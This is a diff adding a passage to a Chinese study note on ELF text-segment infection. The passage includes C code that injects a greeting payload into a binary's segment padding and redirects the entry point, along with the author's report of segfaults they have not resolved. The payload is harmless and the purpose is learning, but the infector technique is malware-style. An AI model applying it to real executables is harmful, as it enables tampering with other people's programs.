@@ -4442,3 +4442,203 @@ char str_1[] = {'H', 'e', 'l', 'l', 'o', ' ', 'W', 'o', 'r', 'l', 'd', '!', '\0'
 
 下面介绍一个text段感染的实例。
 
+在本人的实验环境中，二进制文件的text段和内存镜像都是有填充的，所以进行代码寄生的方法和前面所介绍的代码注入的方法一样，当然个人还是觉得代码注入更加有难度一些。
+
+也就是修改二进制文件的内容，在文件text段的填充区域写入寄生的代码，然后将二进制文件的程序入口点修改为寄生代码的位置，也就是原来的text段的结束地址。这里的寄生代码同样只是打印一句greeting，然后跳转到二进制文件原来的程序入口点的位置，去执行这个文件之文件本来该执行的代码。
+
+这里实验所使用的宿主程序的代码如下：
+
+```c
+// host.c
+// compiled with -no-pie
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+    printf("Hello World!\n");
+    exit(0);
+}
+
+```
+
+宿主程序只是一个简单的hello程序，但是为了能让其以一个固定的地址作为程序入口点，需要在编译的时候关闭地址随机化，也就是使用-no-pie选项进行编译。
+
+实现上述代码寄生的代码如下：
+
+##### parasite_greeting
+
+```c
+/* parasite_greeting.c 
+ * parasite a shellcode to the host.
+ * Usage: ./parasite_greeting <host_file> 
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+#include <errno.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <stdint.h>
+#include <elf.h>
+#include <fcntl.h>
+#include <string.h>
+
+#define PATCH_OFFSET 65
+
+static volatile inline void 
+_write(int, char *, unsigned int)__attribute__((aligned(8), __always_inline__));
+
+static volatile inline void
+_write(int fd, char *buffer, unsigned int len)
+{
+    __asm__ volatile(
+        "mov %0, %%edi\n"
+        "mov %1, %%rsi\n"
+        "mov %2, %%edx\n"
+        "mov $1, %%rax\n"
+        "syscall\n"
+        /* exit(0) */
+        /*
+        "mov $0, %%edi\n"
+        "mov $60, %%rax\n"
+        "syscall\n"
+        */
+        : 
+        : "g"(fd), "g"(buffer), "g"(len)
+    );
+}
+
+void parasite_greeting()
+{
+    char str[] = {'[', 'I', '\'', 'm', 
+    ' ', 'i', 'n', ' ', 'h', 'e', 'r', 'e', ']','\n', '\0'};
+    _write(1, str, 14);
+    
+    
+    __asm__ volatile(
+        "mov $0x401070, %%rax\n"
+        "jmp *%%rax\n"
+        :
+        : 
+    );
+    
+}
+
+uint8_t *create_shellcode(void (*fn)(),size_t len)
+{
+    int i;
+    uint8_t *mem = malloc(len);
+    uint8_t *ptr = (uint8_t *)fn;
+    for(i = 0; i < len; i++) mem[i] = ptr[i];
+    return mem;
+}
+
+uint64_t f1 = (uint64_t)parasite_greeting;
+uint64_t f2 = (uint64_t)create_shellcode;
+
+int main(int argc, char *argv[])
+{
+    if(argc < 2)
+    {
+        printf("Usage: %s <exec_file>\n", argv[0]);
+        exit(-1);
+    }
+    size_t parasite_len = ((f2 - f1) + 7) & (~7);
+    uint8_t *shellcode = create_shellcode(parasite_greeting, parasite_len);
+
+    char *file_name = strdup(argv[1]);
+    int fd;
+    if((fd = open(file_name, O_RDWR)) < 0)
+    {
+        perror("open");
+        exit(-1);
+    }
+    struct stat st;
+    if(fstat(fd, &st) < 0)
+    {
+        perror("fstat");
+        exit(-1);
+    }
+    uint8_t *mem = mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
+    if(mem == NULL)
+    {
+        perror("mmap");
+        exit(-1);
+    }
+    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)mem;
+    Elf64_Phdr *phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
+    Elf64_Shdr *shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];
+    Elf64_Off parasite_off;
+    Elf64_Addr new_entry;
+    int i;
+    for(i = 0; i < ehdr->e_phnum; i++)
+    {
+        if((phdr[i].p_type == PT_LOAD) && (phdr[i].p_flags == PF_R + PF_X))
+        {
+            parasite_off = phdr[i].p_offset + phdr[i].p_filesz;
+            phdr[i].p_filesz += parasite_len;
+            new_entry = phdr[i].p_vaddr + phdr[i].p_memsz;
+            phdr[i].p_memsz += parasite_len;
+        }
+    }
+    for(i = 0; i < ehdr->e_shnum; i++)
+    {
+        if(shdr[i].sh_offset+shdr[i].sh_size == parasite_off)
+            shdr[i].sh_size += parasite_len;
+    }
+    uint32_t old_entry = ehdr->e_entry;
+    ehdr->e_entry = new_entry;
+    if(lseek(fd, 0, SEEK_SET) < 0)
+    {
+        perror("lseek");
+        exit(-1);
+    }
+    if(write(fd, mem, sizeof(Elf64_Ehdr) + ehdr->e_phentsize * ehdr->e_phnum) < 0)
+    {
+        perror("write");
+        exit(-1);
+    }
+    /* patch the shellcode, but here we have a fixed entry point of host
+    *(uint32_t *)&shellcode[PATCH_OFFSET] = old_entry;
+    */
+    if(lseek(fd, parasite_off, SEEK_SET) < 0)
+    {
+        perror("lseek");
+        exit(-1);
+    }
+    if(write(fd, shellcode, parasite_len) < 0)
+    {
+        perror("write");
+        exit(-1);
+    }
+    if(lseek(fd, ehdr->e_shoff, SEEK_SET) < 0)
+    {
+        perror("lseek");
+        exit(-1);
+    }
+    if(write(fd, shdr, ehdr->e_shentsize * ehdr->e_shnum) < 0)
+    {
+        perror("write");
+        exit(-1);
+    }
+    close(fd);
+    return 0;
+}
+```
+
+下面演示实验的结果：
+
+![parasite_greeting_segfault](./image/parasite_greeting_segfault.png)
+
+这里出现和前面代码注入的实验中类似的错误，也就是修改宿主程序的PC以转移其控制流时，宿主程序能够正确执行寄生的代码，但是想要让程序继续执行其原来的代码时，会出现段错误。如下示意图所示：
+
+![parasite_greeting_segfault_illustration](./image/parasite_greeting_segfault_illustration.png)
+
+想要让宿主程序正确执行，本人目前所想到的唯一办法就是让宿主程序执行寄生的shellcode后直接退出，因为不管让宿主程序执行完shellcode后跳转到程序原来的任何一个位置都会在退出的时候出现一个段错误。
+
+如下：
+
+![parasite_greeting](./image/parasite_greeting.png)
+
+如何让宿主程序在执行完寄生代码后继续执行其原来的代码依然是一个待解决的问题。
